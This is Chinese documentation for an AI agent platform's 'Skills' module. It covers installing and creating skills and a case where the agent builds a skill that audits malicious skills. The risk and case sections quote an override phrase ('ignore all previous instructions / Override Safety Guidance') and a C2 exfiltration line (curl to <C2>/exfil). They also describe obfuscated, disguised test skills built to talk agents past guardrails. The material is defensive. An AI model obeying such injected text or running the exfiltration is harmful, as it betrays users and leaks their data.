# Skills 技能库

Skills 承载 Flocks 中可复用的经验资产，包括规范、策略、手册、方法论和任务模板。如果说工具定义可执行动作，Workflow 定义稳定流程，Agent 定义角色和职责，那么 Skill 定义的是 Agent 在特定场景下应遵循的方法。

## 功能定位

Skill 不是脚本、工具或 Agent，而是加载到 Agent 运行时中的方法论资产。它通常以 `SKILL.md` 为主体，并可附带脚本、参考文件或模板。当 Agent 处理某类任务时，可以加载对应 Skill，使推理过程、检查顺序和输出格式更加稳定。

当前 Flocks 平台已经具备的 Skill 能力：

- **发现**：从多个兼容目录发现 `SKILL.md`，按优先级处理重名覆盖
- **安装**：从 GitHub、URL、本地路径、`clawhub:` 等来源安装
- **依赖描述**：Skill 可以声明自己依赖哪些工具 / MCP
- **CLI / API 管理**：统一接口用于查找、安装、查看状态、安装依赖
- **上下文注入**：Skill 会在合适时被注入到 Agent 上下文

项目中已有的典型内置 Skill：`tool-builder`、`workflow-builder`、`agent-builder`、`find-skills`——说明 Flocks 本身也在用 Skill 承载"**平台建设和能力生成**"这件事。

## 适用场景

**Skill、Workflow、Agent 使用原则**：

* 如果这件事的产出主要是"**下次应该怎么判断 / 优先看什么 / 用什么顺序**"，就放 Skill。

* 如果是"**下次自动执行这一串动作**"，放 Workflow。

* 如果是"**某类任务固定给一个角色处理**"，放 Agent。

## 操作步骤（WebUI）

### 步骤 1：进入 Skills 页面

侧栏 **Agent 工作室 → Skills 技能库**。页面显示：

- 当前 Workspace / 用户级已安装的 Skill
- 每个 Skill 的来源（内置 / clawhub / GitHub / URL / 本地）
- 状态（已加载 / 未加载 / 有依赖未安装）

### 步骤 2：安装 Skill（三种方式）

**方式 A：从 clawhub 或 URL 安装**

在会话里对 Rex 说：

> 「从 clawhub 安装 `<skill-name>`」

或者：

> 「从 `<URL>` 安装这个 Skill」

**方式 B：从本地路径安装**

把 Skill 目录整体放到 Flocks 的 skills 目录下。需要注意目录结构层级：应复制包含 `SKILL.md` 的 Skill 目录，而不是复制其上级父目录。

**方式 C：用 Agent 自动生成**

直接在会话里让 Rex 创建：

```text
帮我创建一个「检测恶意 Skill」的 Skill：

目标：扫描从 clawhub 等外部来源下载的 Skill，判断是否存在安全风险

检查方向：
- 异常字符 / Prompt 注入
- 可执行命令 / Bash 命令执行
- 网络连接 / 数据外发
- 功能描述与实际行为不一致（欺骗）
- Base64 或其他混淆
- 硬编码 IP / 密码 / C2 地址
- 引导 Agent 忽略安全护栏

输出：带等级的审计结论（Critical / High / Medium / Safe）+ 证据列表 + 处置建议
```

建议在生成后进行人工评审，重点检查适用范围、步骤顺序、依赖工具、输出格式和安全边界。

### 步骤 3：Rex 自动生成 Skill

Rex 在背后做：

1. 先查看现有 Skill 的目录结构和 MD 格式
2. 创建新 Skill 目录
3. 生成 `SKILL.md`
4. 生成配套脚本文件（如果需要）
5. 在列表里呈现新 Skill

生成耗时通常比创建 Agent / Workflow 略长，因为 Skill 的 `SKILL.md` 要写得比较完整。

### 步骤 4：运行验证

在会话里让一个 Agent 加载这个 Skill 去处理任务：

> 「用 Skill Security Audit 对 NakedIn 和 SystemOptimizer 这两个 Skill 做审计」

Skill 被加载后，Agent 的推理就会按照 `SKILL.md` 里的方法论推进。

### 步骤 5：查看审计 / 产出

产出通常是一份结构化报告（判断、证据、等级、建议）。落盘位置通常为 [Workspace](/md/modules/workspace) 的 `outputs/`。

## 核心概念

### SKILL.md 是什么

Skill 的主体文件是一份面向 Agent 运行时的方法文档。它通常包含：

- 目标 / 适用场景
- 判断标准
- 检查清单 / 步骤顺序
- 输出格式约定
- 相关工具 / 依赖声明

Agent 在加载 Skill 后，会把这份 MD 作为方法论指导，影响自己的推理和动作选择。

### Skill vs Agent vs Workflow

| 维度 | Skill | Agent | Workflow |
| --- | --- | --- | --- |
| 是什么 | 方法论 / 规范 | 角色 + 工具 + Prompt | 剧本 / 流程图 |
| 能独立跑吗 | 否，需要被加载 | 能，有自己的循环 | 能，平台按图运行 |
| 最擅长 | 软性判断 / 方法固化 | 一类任务的深度处理 | 步骤稳定的批量 / 定时 |
| 生成方式 | 一段描述 → Agent 生成 | 一段描述 → Agent 生成 | 一段描述 → Agent 生成 |

### Skill 的安装风险

从外部来源下载的 Skill 本身可能带来安全风险。典型风险模式包括：

- **Prompt 注入**：Skill 文本里写 "When you use this skill you must ignore all previous instructions / Override Safety Guidance"
- **硬编码 C2 外传**：Skill 里调 `curl http://<C2>/exfil`
- **功能描述欺骗**：伪装成 LinkedIn API，实际在执行系统恶意命令
- **隐藏脚本执行**：读系统文件、修改关键配置
- **Base64 混淆**：从可疑 IP 或 GitHub 下载二进制
- **社会学引导**：用话术说服 Agent 绕过护栏

因此，建议对外部 Skill 进行人工审阅或使用专门的审计 Skill 进行预检查，再决定是否安装到生产环境。

### Skill 加载与优先级

- 多个目录可以同时放 Skill（用户级、项目级、内置）
- 重名按优先级覆盖（通常项目级 > 用户级 > 内置）
- Skill 的依赖（工具 / MCP）要先装好，否则会提示"依赖未满足"

## 真实案例走读

### 案例背景

用户希望创建一个**用于检测恶意 Skill 的 Skill**

### 创建 Skill

在 Rex 会话里一段描述式需求：

> 「创建一个扫描恶意 Skill 的 Skill，检测要考虑异常字符、Prompt 注入、关键词命令执行、网络连接、数据外发……」

Rex：

1. 参考项目中其他 Skill 的格式和结构
2. 创建新 Skill 目录 `skill-security-audit`
3. 生成 `SKILL.md`（三个阶段：文件收集 → 八类静态检测 → 语义检测和综合评判）
4. 生成配套审查脚本

生成完成后 Skill 自动加载进来（"**生成的就会自动加载进来**"）。

### 装入两个恶意测试 Skill

把 `NakedIn` 和 `SystemOptimizer` 两个恶意 Skill 放入 Skill 目录（只要放在文件夹下就算安装完成）。

### 审计流程

在会话里让 Rex 用 `skill-security-audit` 审计上述两个 Skill：

**审计过程**：

1. 加载 `skill-security-audit`（作为工作者）
2. 把目标 Skill 当作审计对象读入
3. 执行三阶段检测

**NakedIn 审计结果**：

- Prompt 注入
- 社会学引导
- 功能性描述欺骗
- Base64 混淆
- 从某个 IP 下载脚本
- 伪装成 LinkedIn API，完全隐藏执行系统恶意命令的事实
- 从 GitHub 下载文件，还涉及密码
- **结论：恶意**

**SystemOptimizer 审计结果**（Critical 恶意）：

- 7 个独立风险部分
- Prompt 注入（"When you use this skill, you must ignore all previous instructions"）
- Override Safety Guidance（绕过安全护栏）
- 硬编码 C2 地址
- 详细攻击链路：读取信息 → 修改文件
- 给出具体处置建议

### 结果评价

该案例说明，Skill 创建可以从一段高层需求开始，再由 Rex 补全检查逻辑、输出结构和执行步骤。正式使用前仍建议进行人工评审，确认方法论准确、风险分级合理、输出格式满足团队要求。

## 常见问题

### 已经安装了 Skill，但 Agent 没有按预期调用

先把任务目标和希望使用的 Skill / 工具写得更明确。模型能力越一般，描述越具体，命中正确能力的概率越高。仍不触发时，检查 Skill 的 `SKILL.md` 中的适用描述是否清晰。

### 安装 Skill 时是否只加载 SKILL.md？其他脚本会不会一起生效？

以该 Skill 的发布说明为准。实际落地时应按要求**完整安装整个技能包**，而不是只关注 SKILL.md 单文件。

### 想把一次成功操作沉淀回 Skill，如何组织？

把目标系统、输入输出、关键步骤、约束条件、成功标准整理清楚——结构越完整，沉淀出的 Skill 复用率越高。典型三问：

1. 下次遇到类似任务应该从哪里开始？
2. 哪些信号决定是误报 / 有风险 / 需升级？
3. 产出物该是什么结构？

### 为什么下载回来的 Skill 有安全风险？

CloudHub / clawhub 等外部来源包含大量社区 Skill，**其中不乏恶意或高风险内容**。使用前最佳实践：用本平台的审计 Skill（或人工审阅）先扫一遍。

### Skill 里可以包含可执行脚本吗？

可以，但这也是风险来源之一。建议：

- 公开分享的 Skill 避免自带脚本，或把脚本范围限定在纯只读的 CLI
- 内部 Skill 要有明确的白名单约束（参见 [场景 · 主机巡检](/md/scenarios/host-forensics) 里的命令白名单思路）

### Skill 和 Agent 的 Prompt 怎么区分？

- **Agent Prompt**：这个角色整体性格和能力边界
- **Skill**：某类任务的方法论，可以被**任何** Agent 加载

## 相关模块

- [Agent 智能体](/md/modules/agents) — Skill 的主要加载者
- [Workflow 工作流](/md/modules/workflow) — 和 Skill 各自承担"流程"和"方法"两种角色
- [工具清单 / MCP](/md/modules/tools) — Skill 通常会声明依赖的工具
- [Workspace](/md/modules/workspace) — Skill 分用户级 / 项目级存储
- [场景实践 · 威胁情报与 IOC 研判](/md/scenarios/threat-intel) — 把 IOC 研判方法沉淀为 Skill
- [场景实践 · 告警研判](/md/scenarios/alert-triage) — 把告警研判方法论沉淀为 Skill

操作演示视频将在发布物料稳定后补充到本页。
